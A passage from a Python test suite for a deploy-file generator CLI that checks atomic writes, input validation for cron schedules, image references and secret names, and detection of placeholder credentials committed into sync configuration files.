    real_link = os.link

    def racing_link(src: Any, dst: Any, **kw: Any) -> None:
        Path(dst).write_text("appeared after the check")
        real_link(src, dst, **kw)

    monkeypatch.setattr("drt.cli.commands.deploy.os.link", racing_link)

    result = runner.invoke(app, ["deploy", "github-actions"])

    assert result.exit_code == 1 and target.read_text() == "appeared after the check"


def test_an_unwritable_parent_is_a_clean_error_not_a_traceback(project: Path) -> None:
    import os

    locked = project / "locked"
    locked.mkdir()
    locked.chmod(0o500)
    try:
        if os.access(locked, os.W_OK):  # running as root: nothing to prove
            pytest.skip("directory permissions are not enforced for this user")
        result = runner.invoke(
            app,
            ["deploy", "cloud-run-job", "--schedule", "0 6 * * *", "--output-dir", "locked/new"],
        )
    finally:
        locked.chmod(0o700)

    assert result.exit_code == 1 and "Cannot create" in result.output
    assert result.exception is None or isinstance(result.exception, SystemExit)


def test_without_force_an_existing_file_is_never_truncated(project: Path) -> None:
    target = project / ".github" / "workflows" / "drt-sync.yml"
    target.parent.mkdir(parents=True)
    target.write_text("mine")

    result = runner.invoke(app, ["deploy", "github-actions"])

    assert result.exit_code == 1 and target.read_text() == "mine"


def test_a_directory_in_the_way_fails_before_anything_is_overwritten(project: Path) -> None:
    root = project / "deploy" / "cloud-run-job"
    root.mkdir(parents=True)
    (root / "Dockerfile").write_text("old dockerfile")
    (root / "job.yaml").mkdir()

    result = runner.invoke(app, ["deploy", "cloud-run-job", "--schedule", "0 6 * * *", "--force"])

    assert result.exit_code == 1 and "directory" in result.output
    assert (root / "Dockerfile").read_text() == "old dockerfile"


def test_scheduler_script_is_executable(project: Path) -> None:
    runner.invoke(app, ["deploy", "cloud-run-job", "--schedule", "0 6 * * *"])

    mode = (project / "deploy/cloud-run-job/scheduler.sh").stat().st_mode & 0o777
    assert mode == 0o750  # owner+group only: no world access (CodeQL py/overly-permissive-file)


@pytest.mark.parametrize(
    "schedule",
    ["*/ * * * *", "JAN * * * *", "* * * MON *", "* * * * JAN", "0 0 1 MON *", "*/0 * * * *"],
)
def test_cron_names_and_steps_are_only_valid_where_cron_allows_them(
    project: Path, schedule: str
) -> None:
    assert runner.invoke(app, ["deploy", "cloud-run-job", "--schedule", schedule]).exit_code == 1


@pytest.mark.parametrize("image", ["", "my image", 'x"y', "img\n:latest"])
def test_a_bad_k8s_image_reference_is_refused(project: Path, image: str) -> None:
    result = runner.invoke(
        app, ["deploy", "k8s-cronjob", "--schedule", "0 6 * * *", "--image", image]
    )

    assert result.exit_code == 1


@pytest.mark.parametrize("name", ["Has_Upper", "-leading", "trailing-", "a b", "x" * 254])
def test_a_non_dns_secret_name_is_refused(project: Path, name: str) -> None:
    result = runner.invoke(
        app, ["deploy", "k8s-cronjob", "--schedule", "0 6 * * *", "--secret-name", name]
    )

    assert result.exit_code == 1


def test_a_missing_profiles_yml_is_called_out_in_the_next_steps(project: Path) -> None:
    (project / "profiles.yml").unlink()

    result = runner.invoke(app, ["deploy", "cloud-run-job", "--schedule", "0 6 * * *"])

    assert result.exit_code == 0 and "No profiles.yml was found" in result.output


@pytest.mark.parametrize(
    "snippet",
    [
        "  auth:\n    type: api_key\n    value: sk-live-abc\n",
        "  headers:\n    Authorization: Bearer abc123\n",
        "  webhook_url: https://hooks.example.invalid/T000/B000/XXXX\n",
        "  password: hunter2-${REGION}\n",
    ],
)
def test_more_literal_credential_shapes_are_caught(project: Path, snippet: str) -> None:
    (project / "syncs" / "leaky.yml").write_text(
        "name: leaky\nmodel: ref('x')\ndestination:\n  type: rest_api\n  url: https://x.invalid\n"
        + snippet
        + "sync:\n  mode: full\n"
    )

    result = runner.invoke(app, ["deploy", "cloud-run-job", "--schedule", "0 6 * * *"])

    assert result.exit_code == 1 and "leaky.yml" in result.output


def test_data_fields_named_like_credentials_are_not_flagged(project: Path) -> None:
    (project / "syncs" / "ok.yml").write_text(
        "name: ok\nmodel: ref('x')\ndestination:\n  type: rest_api\n  url: https://x.invalid\n"
        "sync:\n  mode: full\n  mask:\n    token: hash\n"
    )

    assert runner.invoke(app, ["deploy", "cloud-run-job", "--schedule", "0 6 * * *"]).exit_code == 0


@pytest.mark.parametrize("image", ["repo:", "a//b", "img:", "x@", "a:b:c:", "/abs"])
def test_malformed_image_references_are_refused(project: Path, image: str) -> None:
    result = runner.invoke(
        app, ["deploy", "k8s-cronjob", "--schedule", "0 6 * * *", "--image", image]
    )

    assert result.exit_code == 1


@pytest.mark.parametrize("name", ["a" * 64, "ok." + "b" * 64, "a..b"])
def test_secret_names_obey_the_63_character_label_limit(project: Path, name: str) -> None:
    result = runner.invoke(
        app, ["deploy", "k8s-cronjob", "--schedule", "0 6 * * *", "--secret-name", name]
    )

    assert result.exit_code == 1


# ---------------------------------------------------------------------------
# Fourth adversarial round (#1291)
# ---------------------------------------------------------------------------


def test_a_failure_while_publishing_names_the_files_already_written_and_leaves_no_temp_files(
    project: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """No rollback by design: the error says what was written, and the files are in Git."""
    import os

    root = project / "deploy" / "cloud-run-job"
    real_link = os.link
    calls = {"n": 0}

    def flaky_link(src: Any, dst: Any, **kw: Any) -> None:
        calls["n"] += 1
        if calls["n"] == 2:  # the second file cannot be published
            raise PermissionError(13, "Permission denied")
        real_link(src, dst, **kw)

    monkeypatch.setattr("drt.cli.commands.deploy.os.link", flaky_link)

    result = runner.invoke(app, ["deploy", "cloud-run-job", "--schedule", "0 6 * * *"])

    assert result.exit_code == 1
    flat = " ".join(result.output.split())  # the terminal wraps long lines
    assert "Already written before the failure" in flat and "Dockerfile" in flat
    assert not list(root.glob(".*.tmp"))  # staging leftovers are always removed


def test_a_staging_failure_changes_nothing_at_all(
    project: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    import os

    root = project / "deploy" / "cloud-run-job"
    root.mkdir(parents=True)
    (root / "Dockerfile").write_text("old")
    real_open = os.open
    calls = {"n": 0}

    def flaky_open(path: Any, flags: int, mode: int = 0o600) -> int:
        calls["n"] += 1
        if calls["n"] == 2:
            raise PermissionError(13, "Permission denied")
        return real_open(path, flags, mode)

    monkeypatch.setattr("drt.cli.commands.deploy.os.open", flaky_open)

    result = runner.invoke(app, ["deploy", "cloud-run-job", "--schedule", "0 6 * * *", "--force"])

    assert result.exit_code == 1 and (root / "Dockerfile").read_text() == "old"
    assert not list(root.glob(".*.tmp"))


def test_deploy_works_where_the_platform_has_no_fchmod(
    project: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Windows has no os.fchmod; the writer must fall back instead of raising AttributeError."""
    import os

    monkeypatch.delattr(os, "fchmod")

    result = runner.invoke(app, ["deploy", "github-actions"])

    assert result.exit_code == 0, result.output
    assert (project / ".github/workflows/drt-sync.yml").is_file()


def test_a_stale_temp_file_from_a_crashed_run_does_not_wedge_the_next_run(project: Path) -> None:
    import os

    target_dir = project / ".github" / "workflows"
    target_dir.mkdir(parents=True)
    (target_dir / f".drt-sync.yml.{os.getpid()}.tmp").write_text("left by a crash")

    result = runner.invoke(app, ["deploy", "github-actions"])

    assert result.exit_code == 0, result.output


def test_uppercase_env_reference_keys_are_runtime_secrets(project: Path) -> None:
    (project / "profiles.yml").write_text(
        "default:\n  type: deltalake\n  AWS_SECRET_ACCESS_KEY_ENV: AWS_SECRET\n"
    )

    result = runner.invoke(app, ["deploy", "cloud-run-job", "--schedule", "0 6 * * *"])

    assert result.exit_code == 0, result.output
    assert "AWS_SECRET" in (project / "deploy/cloud-run-job/job.yaml").read_text()


@pytest.mark.parametrize("value", ["Bearer ${ALERT_TOKEN}", "${ALERT_TOKEN}", "Basic ${B64}"])
def test_a_scheme_wrapped_reference_is_not_an_inline_secret(project: Path, value: str) -> None:
    (project / "syncs" / "ok.yml").write_text(
        "name: ok\nmodel: ref('x')\ndestination:\n  type: rest_api\n  url: https://x.invalid\n"
        f'  headers:\n    Authorization: "{value}"\nsync:\n  mode: full\n'
    )

    assert runner.invoke(app, ["deploy", "cloud-run-job", "--schedule", "0 6 * * *"]).exit_code == 0


@pytest.mark.parametrize(
    "snippet",
    [
        "  headers:\n    X-API-Key: abc123\n",
        "  headers:\n    x-api-key: abc123\n",
        "alerts:\n  on_failure:\n    - type: webhook\n      url: https://hooks.example.invalid/SECRET\n",
    ],
)
def test_more_credential_shapes_bypass_nothing(project: Path, snippet: str) -> None:
    body = (
        "name: leaky\nmodel: ref('x')\ndestination:\n  type: rest_api\n  url: https://x.invalid\n"
    )
    tail = "sync:\n  mode: full\n"
    text = body + (snippet if snippet.startswith(" ") else "") + tail
    if not snippet.startswith(" "):
        text += snippet
    (project / "syncs" / "leaky.yml").write_text(text)

    result = runner.invoke(app, ["deploy", "cloud-run-job", "--schedule", "0 6 * * *"])

    assert result.exit_code == 1 and "leaky.yml" in result.output


def test_numeric_and_url_embedded_credentials_are_caught(project: Path) -> None:
    (project / "syncs" / "numeric.yml").write_text(
        "name: numeric\nmodel: ref('x')\ndestination:\n  type: rest_api\n  url: https://x.invalid\n"
        "  password: 12345678\nsync:\n  mode: full\n"
    )
    first = runner.invoke(app, ["deploy", "cloud-run-job", "--schedule", "0 6 * * *"])
    (project / "syncs" / "numeric.yml").unlink()
    (project / "syncs" / "url.yml").write_text(
        "name: url\nmodel: ref('x')\ndestination:\n  type: rest_api\n"
        "  url: https://user:s3cret@example.invalid/api\nsync:\n  mode: full\n"
    )
    second = runner.invoke(app, ["deploy", "cloud-run-job", "--schedule", "0 6 * * *"])

    assert first.exit_code == 1 and "numeric.yml: destination.password" in first.output
    assert second.exit_code == 1 and "url.yml: destination.url" in second.output
    assert "12345678" not in first.output and "s3cret" not in second.output


def test_a_plain_url_without_credentials_or_with_a_placeholder_is_fine(project: Path) -> None:
    (project / "syncs" / "ok.yml").write_text(
        "name: ok\nmodel: ref('x')\ndestination:\n  type: rest_api\n"
        "  url: https://${API_USER}:${API_PASS}@example.invalid/api\nsync:\n  mode: full\n"
    )

    assert runner.invoke(app, ["deploy", "cloud-run-job", "--schedule", "0 6 * * *"]).exit_code == 0


def test_identical_plan_and_apply_outputs_are_refused(project: Path) -> None:
    result = runner.invoke(
        app,
        [
            "deploy",
            "github-actions",
            "--with-plan",
            "--plan-output",
            ".github/workflows/same.yml",
            "--apply-output",
            ".github/workflows/same.yml",
        ],
    )

    assert result.exit_code == 1 and "must be different" in result.output
    assert not (project / ".github").exists()
